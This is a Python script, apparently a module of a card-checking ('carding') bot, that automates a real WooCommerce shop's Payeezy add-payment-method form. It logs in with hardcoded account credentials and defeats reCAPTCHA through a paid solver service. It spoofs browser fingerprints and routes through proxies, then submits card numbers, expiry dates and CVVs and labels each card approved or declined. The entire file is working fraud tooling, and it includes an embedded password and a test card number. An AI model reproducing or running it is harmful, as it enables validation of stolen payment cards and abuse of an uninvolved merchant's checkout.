# Pure gate motor for 'payezzy' — Payeezy (First Data) Auth @ seocontenthero.com.
# Source: new_gates/( payezzy ) ( auth ).py  |  By @acxrd (NxFech)

import os
import random
import re
import time

import requests as req
from curl_cffi import requests as curt

_GATEWAY = 'Payezzy Auth (seocontenthero.com)'

_CAPSOLVER_KEY = os.getenv('CAPSOLVER_KEY', '').strip()
_LOGIN_USER = os.getenv('PAYEZZY_LOGIN', 'relopa66@gmail.com')
_LOGIN_PASS = os.getenv('PAYEZZY_PASS', 'KaldenChk1')


class _Clxter:
    @staticmethod
    def capture(string, init, offset):
        return string.split(init)[1].split(offset)[0]

    @staticmethod
    def verifyCard(text):
        number, month, year, cvv = re.split(r'\s*[|/]\s*|\s+', text)
        year = f'20{year}' if len(year) == 2 else year
        if len(number) < 13:
            raise ValueError('Invalid card number!')
        return {'number': number, 'month': month.zfill(2), 'year': year[-2:], 'cvv': cvv}

    @staticmethod
    def getResponse(response):
        responses = ['Duplicate card exists in the vault', 'funds', 'Nice! New payment method added']
        for i in responses:
            if i in response:
                return True
        return False

    @staticmethod
    def reCaptchaSolver(site_key, site_url):
        capsolver = _CAPSOLVER_KEY
        data = {'clientKey': capsolver, 'task': {'type': 'RecaptchaV2TaskProxyless', 'websiteURL': site_url, 'websiteKey': site_key}}
        request = req.post(url='https://api.capsolver.com/createTask', json=data).json()
        for _tries in range(20):
            time.sleep(2)
            response = req.post(url='https://api.capsolver.com/getTaskResult',
                                json={'clientKey': capsolver, 'taskId': request['taskId']}).json()
            if response['status'] == 'ready':
                return {'status': True, 'time': response['solution']['createTime'],
                        'result': response['solution']['gRecaptchaResponse']}
        raise Exception('Captcha not solved :(')


def _flow(text, tcp=None, retries=0):
    card = _Clxter.verifyCard(text)
    now_t = time.time()
    model = curt.Session(impersonate=random.choice(['chrome120', 'firefox135']))
    model.proxies = {'http': f'http://{tcp}', 'https': f'http://{tcp}'} if tcp else None
    try:
        headers1 = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'es-MX,es;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Referer': 'https://seocontenthero.com/my-account/add-payment-method/',
            'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i', 'TE': 'trailers'}
        request1 = model.get('https://seocontenthero.com/my-account/add-payment-method/', headers=headers1)
        lnonce = _Clxter.capture(request1.text, 'name="woocommerce-login-nonce" value="', '"')

        headers2 = {**headers1,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://seocontenthero.com',
                    'Referer': 'https://seocontenthero.com/my-account/'}
        data2 = {'username': _LOGIN_USER, 'password': _LOGIN_PASS,
                 'woocommerce-login-nonce': lnonce, '_wp_http_referer': '/my-account/',
                 'login': 'Log in'}
        model.post('https://seocontenthero.com/my-account/', headers=headers2, data=data2)

        headers3 = {k: v for k, v in headers1.items() if k not in ('Referer', 'Content-Type', 'Origin')}
        request3 = model.get('https://seocontenthero.com/my-account/add-payment-method/', headers=headers3)
        mnonce = _Clxter.capture(request3.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')

        captcha = _Clxter.reCaptchaSolver(
            site_key='6LcTw9gaAAAAANwnzYR0sJ-bz6Hqhp2f1IrzCJGL',
            site_url='https://seocontenthero.com/')['result']

        headers4 = {**headers1,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://seocontenthero.com',
                    'Referer': 'https://seocontenthero.com/my-account/add-payment-method/'}
        data4 = {
            'payment_method': 'first_data_payeezy_gateway_credit_card',
            'wc-first-data-payeezy-gateway-credit-card-context': 'shortcode',
            'wc-first-data-payeezy-gateway-credit-card-account-number': card['number'],
            'wc-first-data-payeezy-gateway-credit-card-expiry': card['month'] + '/' + card['year'],
            'wc-first-data-payeezy-gateway-credit-card-csc': card['cvv'],
            'wc-first-data-payeezy-gateway-credit-card-tokenize-payment-method': 'true',
            'g-recaptcha-response': captcha,
            'woocommerce-add-payment-method-nonce': mnonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        request4 = model.post('https://seocontenthero.com/my-account/add-payment-method/', headers=headers4, data=data4)

        if 'Nice! New payment method added' in request4.text:
            return {'status': True, 'success': True,
                    'response': 'Approved ✅ | Nice! New payment method added'}
        msg = re.search(r'<ul class="woocommerce-error"[^>]*>.*?</ul>', request4.text, re.DOTALL)
        msg = re.sub(r'<[^>]+>', '', msg.group()).strip() if msg else ''
        msg = re.sub(r'\s+', ' ', msg).strip()
        if _Clxter.getResponse(request4.text):
            return {'status': True, 'success': True, 'response': f'Approved ✅ | {msg or "funds/duplicate"}'}
        return {'status': True, 'success': False, 'response': f'Declined ❌ | {msg or request4.text[:80]}'}
    except Exception as error:
        if retries < 3:
            return _flow(text, tcp=tcp, retries=retries + 1)
        return {'status': False, 'raise': f'Exception as error -> {str(error)}'}


def _checker(cc, bin_data, proxy=None):
    if not _CAPSOLVER_KEY:
        return {'status': False,
                'raise': 'CAPSOLVER_KEY no configurada — define CAPSOLVER_KEY en Model/config.env o .env para usar este gate.'}
    try:
        card_str = f'{cc[0]}|{cc[1]}|{cc[2]}|{cc[3]}'
        r = _flow(card_str, tcp=proxy or None)
        if not r.get('status'):
            return {'status': False, 'raise': r.get('raise', 'Payezzy flow failed')[:200]}
        return r
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}


def run_check(cc, bin_data, ctx=None):
    ctx = ctx or {}
    proxy = (ctx.get('proxy') or '').strip()
    r = _checker(cc, bin_data, proxy=proxy)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}


if __name__ == '__main__':
    print(run_check(['4000222379753652', '09', '29', '938'], ''))